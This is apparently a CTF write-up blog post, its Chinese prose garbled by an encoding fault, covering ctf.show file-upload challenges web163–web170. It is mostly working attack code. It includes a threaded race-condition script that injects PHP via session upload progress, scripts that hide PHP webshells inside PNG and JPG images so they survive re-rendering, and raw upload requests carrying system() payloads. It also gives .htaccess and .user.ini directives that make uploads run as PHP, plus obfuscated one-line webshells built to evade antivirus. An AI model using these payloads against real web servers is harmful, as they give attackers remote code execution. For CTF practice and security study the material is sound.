<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">sess = <span class="string">&#x27;evo1&#x27;</span></span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&#x27;http://703e9d52-141b-4ca2-9b3d-09aa927e88a7.challenge.ctf.show/&#x27;</span></span><br><span class="line">url2 = <span class="string">&#x27;http://703e9d52-141b-4ca2-9b3d-09aa927e88a7.challenge.ctf.show/upload/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">	<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file=&#123;</span><br><span class="line">	<span class="string">&#x27;file&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cookies=&#123;</span><br><span class="line">	<span class="string">&#x27;PHPSESSID&#x27;</span>: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		session.post(url=url1, data=data, files=file, cookies=cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		r = session.get(url2)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			<span class="built_in">print</span>(r.text)</span><br><span class="line">			</span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">	t.start()</span><br></pre></td></tr></table></figure>

<h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2><p>pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ç»•è¿‡ï¼Œç”¨<code>yu22x</code>çš„è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;2.png&#x27;</span>);  <span class="comment">//è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„</span></span><br><span class="line"><span class="comment">/* æœ¨é©¬å†…å®¹</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆå›¾ç‰‡ğŸä¸Šä¼ åç‚¹å‡»æŸ¥çœ‹ï¼Œç„¶åæ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/download.php?image=fb5c81ed3a220004b71069645f112867.png&amp;0=system</span><br><span class="line">POST:</span><br><span class="line">1=cat f*</span><br></pre></td></tr></table></figure>

<p><code>ctrl+s</code>ä¿å­˜ä¸‹æ¥æŸ¥çœ‹å›¾ç‰‡æ–‡æœ¬å³å¯</p>
<p><img src="https://cdnjson.com/images/2023/02/08/web164.jpg" alt="web164.jpg"></p>
<h2 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h2><p>jpgå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ç»•è¿‡ï¼Œè¿˜æ˜¯ç”¨<code>yu22x</code>çš„è„šæœ¬(å¤§ä½¬<code>orz</code>)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//ç”¨æ³•  php JpgRendering.php test.jpg</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?php system(&#x27;tac f*&#x27;);?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ä¸‹<code>å›½å…‰</code>å¸ˆå‚…çš„å›¾ç‰‡ï¼Œç„¶åæµç¨‹å‚è€ƒäº†<a target="_blank" rel="noopener" href="https://www.wlhhlc.top/posts/14827/#web165">dota_st</a>å¸ˆå‚…çš„åšå®¢ï¼Œè¦å…ˆä¸Šä¼ ä¸€éåŸå›¾<code>1.jpg</code>ï¼Œç„¶åç‚¹å‡»æŸ¥çœ‹å¹¶æŠŠå›¾ç‰‡ä¸‹è½½ä¸‹æ¥å¹¶å‘½åä¸º<code>2.jpg</code>ï¼Œç´§æ¥ç€ç”¨è„šæœ¬å»ç”Ÿæˆ<code>payload_2.jpg</code>ï¼Œæœ€åä¸Šä¼ å¹¶æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p><img src="https://cdnjson.com/images/2023/02/08/web165.jpg" alt="web165.jpg"></p>
<h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><p>æºç ä¸­å‘ç°åªèƒ½ä¼ <code>zip</code>æ–‡ä»¶</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;layui-btn&quot;</span> <span class="attr">id</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">lay-data</span>=<span class="string">&quot;&#123;url: &#x27;upload.php&#x27;, accept: &#x27;images&#x27;,exts:&#x27;zip&#x27;&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ä¼ ğŸç„¶åå‘åŒ…è®¿é—®å³å¯</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;test.zip&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-zip-compressed</span><br><span class="line"></span><br><span class="line">&lt;?php system(&#x27;cat ../flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><p>æç¤º<code>httpd</code>ï¼Œæ‰€ä»¥æƒ³åˆ°<code>.htaccess</code>ç»•è¿‡</p>
<blockquote>
<p>è¿™é‡Œç®€å•ä»‹ç»å‡ ä¸ªç”¨æ³•</p>
<ol>
<li><p>å°†.pngåç¼€çš„æ–‡ä»¶è§£ææˆphp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure>
</li>
<li><p>åŠŸèƒ½åŒ<code>1</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>å½“å‰æ‰€æœ‰ç±»å‹æ–‡ä»¶è§£æä¸ºphp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php </span><br></pre></td></tr></table></figure>
</li>
<li><p>å¦‚æœflagä¸æ˜¯phpæ–‡ä»¶ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥åƒ.user.iniä¸€æ ·åœ¨å½“å‰ç›®å½•åŠ è½½ä¸€ä¸ªæ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_append_file &#x27;flag&#x27;</span><br></pre></td></tr></table></figure></li>
</ol>
</blockquote>
<p>ä¸Šä¼ å®Œ<code>.htaccess</code>æ–‡ä»¶åä¸Šä¼ å›¾ç‰‡ğŸè®¿é—®æ‰§è¡Œå‘½ä»¤å³å¯</p>
<h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><p>æç¤º<code>åŸºç¡€å…æ€</code></p>
<blockquote>
<p>ç½‘ä¸Šæ‰¾äº†å‡ ä¸ª</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;s#y#s#t#e#m&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">0</span>].<span class="variable">$b</span>[<span class="number">1</span>].<span class="variable">$b</span>[<span class="number">2</span>].<span class="variable">$b</span>[<span class="number">3</span>].<span class="variable">$b</span>[<span class="number">4</span>].<span class="variable">$b</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">substr</span>(<span class="string">&#x27;1s&#x27;</span>,<span class="number">1</span>).<span class="string">&#x27;ystem&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">strrev</span>(<span class="string">&#x27;metsys&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>ä»»é€‰ä¸€ä¸ªä¸Šä¼ ï¼Œè®°å¾—ä¿®æ”¹åç¼€ä¸º<code>.php</code>å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/test.php</span><br><span class="line">POST:</span><br><span class="line">1=tac ../flagaa.php</span><br></pre></td></tr></table></figure>

<h2 id="web169-170"><a href="#web169-170" class="headerlink" title="web169-170"></a>web169-170</h2><p>å‘ç°æ­£å¸¸ä¸Šä¼ <code>php</code>æ–‡ä»¶å†…å®¹ç§åŒ…å«<code>&lt;</code>å°±ä¸è¡Œï¼Œæ‰€ä»¥è€ƒè™‘æ—¥å¿—åŒ…å«(<code>php://input</code>å°è¯•åå‘ç°ä¸è¡Œ)ï¼Œå› ä¸ºç›®å½•ä¸‹æ²¡æœ‰<code>php</code>æ–‡ä»¶æ‰€ä»¥å…ˆä¼ ä¸ª<code>index.php</code>ä¸Šå»</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;index.php&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">evo1ution</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ <code>.user.ini</code>åŒ…å«æ—¥å¿—</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;.user.ini&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>

